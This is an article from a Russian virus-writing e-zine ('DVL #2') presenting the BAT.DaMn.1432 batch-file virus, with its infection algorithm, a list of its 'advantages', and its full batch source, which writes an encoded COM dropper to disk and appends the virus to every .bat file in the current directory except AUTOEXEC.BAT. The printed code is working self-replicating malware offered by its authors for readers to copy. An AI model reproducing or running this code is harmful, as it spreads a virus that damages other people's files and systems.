
[0;1;35m                                D V L  # 2

[33m                               BAT.DaMn.1432
                         (c) by Duke/SMF & SMT/SMF

[34mАвторы        : Duke/SMF & SMT/SMF
Имя вируса    : BAT.DaMn.1432
Дата создания : 23.10.98
Длина         : 1432 байт
Тип           : файловый BAT-вирус

[32mBAT.DaMn [37m- это файловый BAT-файловый вирус, поражающий все файлы в  текущем
каталоге.

[34mАлгоритм работы вируса:
[37m
1. Отключается вывод на экран с помощью [32mCTTY NUL[37m
2. Создается файл [32m$.COM [37mна диске. В него записывается исполнимый код из
   тела вируса.
3. Проводится перебор батников текущего каталога. Для каждого найденного
   батника вызывается файл [32m$.COM [37mс параметрами

4. Файл [32m$.COM [37mпроверяет этот батник на повторное заражение: в батнике ищет-
   ся идентификатор вируса, равный последовательности [32m0Dh,0Ah,':DaMn'[37m. Если
   таковая имеется, то найденный файл уже заражен и [32m$.COM  [37mпрекращает  свою
   работу. Если идентификатор не найден, то в файле с вирусом ищется  иден-
   тификатор и все символы, начиная с него включительно, копируются в  най-
   денный батник.
5. После перебора всех батников удалается файл [32m$.COM [37mи  возвращается  вывод
   на экран.

   Поскольку тело вируса выполняется в ходе его работы всего  один  раз  за
запуск, то вирусу не требуется поражать файл в начало или  проверять  пара-
метры командной строки запущенного батника. Поэтому  вирус  записывается  в
самый конец поражаемых файлов. В вирусе имеется лишь  одна  метка  [32m':DaMn'[37m,
используемая для контроля на повторное заражение. Поскольку подобные  метки
встречаются нечасто ;) , то она не должна мешать работе пораженного файла.
   Внимание! Первыми байтами тела вируса являются байты [32m0Dh, 0Ah [37m, а не ка-
кие либо другие! Для чего это нужно? Встречаются [32mBAT-файлы[37m, последняя стро-
ка которых не оканчивается переходом на новую  строку.  Это  создает  много
проблем вирусописателям и их детищам. При записи вируса в конец такого фай-
ла необходимо сперва поставить [32m0Dh, 0Ah [37m, а лишь затем переносить тело  ви-
руса, (эта ошибка встречается в 90% BAT-вирусов, использующих команды  [32mTYPE
[37mили [32mFIND [37mдля размножения. Смотрите также статью  [32mdvl2-04.ans[37m)  иначе  после
заражения и пораженный [32mBAT-файл[37m, и вирус потеряют работоспособность.  Имен-
но поэтому вирус [32mBAT.DaMn [37mиспользует в качестве идентификатора строку  0Dh,
0Ah, ':DaMn' и переносит вирус в файл-жертву начиная с этого идентификатора.
   Если перед строкой ':DaMn' в файле-вирусе  не  поставить  символов  0Dh,
0Ah, то при запуске файл $.COM, не найдя в вирусе  идентификатора,  завесит
машину.

[34mПреимущества вируса:
[37m
1. Проверка на повторное заражение.
2. Независимость от каких бы то ни было посторонних файлов (например,
   утилит FIND, DEBUG, PKZIP или других).
3. Несмотря на то, что часть вируса написана на ASM'е, в теле вируса содер-
   жатся лишь  текстовые  символы.  Поэтому  никаких  проблем  с  символами
   00h-2Fh (в том числе 7h, 10h, 13h). Тело вируса - 100% текст.
4. Не оставляет после себя посторонних файлов.
5. Не поражает файл AUTOEXEC.BAT

[34mНедостатки вируса:
[37m
1. Прирост файла более 1400 байт
2. Имеется вставка, написанная на ASM

Ниже приводится исходный текст вируса: вируса в виде BAT-файла  и  исходный
текст вставки на ASM'е

BAT-файл с вирусом выглядит следующим образом:
[36m===== Cut here =====
[0;37m
:DaMn
@ctty nul
echo>$ @P@P@P@P@P@P@P@P=-==Da=Mn=Da=Mn=-=XXXXXXXX=
echo>>$ [SSX,@P^SX4a,A(@B(@C0@F0@G0@J0@K0@N0@OSX4@(@@(@A=
echo>>$ SX,@(@H(@I(@J(@K(@L(@L(@M(@M(@N(@N(@O(@O=
echo>>$ SX5CB-@@,@P^SX5BB-@@,@P_=
echo>>$ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
echo>>$ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
echo>>$ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
echo>>$ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
echo>>$ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
echo>>$ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
echo>>$ SX4P8@@tkSX4@8@@rWSX2@@F,@,@VP^SX2@@^2@@4@PSX2A@0A@X0A@G=
echo>>$ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@FSX5@B-@@P@LC
echo>>$ NH@@@@EMHANMAO@IEGHMKFD@@IKOOL@@KI@D@@OC
echo>>$ JDHMKFDD@IKO@@@AEIKHOL@@E@CCL@LCOCJDNK@@
echo>>$ KDDJKK@@@ALMBAOLKOHA@@KHB@@@HJNHBNCH@EGE@ADGEGOBJNBNHICNGG@ADOBNLF@E
echo>>$ @@HKOGDFJLCLB@GOOKDNBNLF@D@@KH@@CMEJLMBAE@KDDHKK@@A@LMBAHNL@HNMHEKKI
echo>>$ OOOOKDCOCCMBLMBAE@KDCNLMBACCOFEFJLCL@MGEABJMCM@JCJGE@LJMCMDDFAGE@FJM
echo>>$ CMDMFNGD@DENDFNKNDHLLHHNMHKH@BCMKJ@@@@LMBAHKMH@FECKK@@A@KDDHLMBAHNMH
echo>>$ HNL@KH@@DBEKCCLICCMBLMBAKIOOOOKDCOCCMBLMBAHKLHCCOFEFJLCL@MGEABJMCM@J
echo>>$ CJGE@LJMCMDDFAGE@FJMCMDMFNGD@GENDFNBNDNK@JI@KDDILMBAEH@GNKAOI@KDDILM
echo>>$ BA@GKH@BDBCCLICCMBLMBAEJEIBKLJHLL@HNMHKDD@LMBAKDCNLMBAKDDILMBAKH@@DL
echo>>$ LMBAEKDDFADMFNBLB@DDGEFKFEB@BFB@ECDMEDB@BOBOB@ECDMDFEMP
ren $ $.com
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT $ %0 %%b
del $.*
ctty con
[1;36m
===== Cut here =====
[37m
Исходный текст ассемблерной вставки смотрите в следующем файле.
[1;35m                            The End of File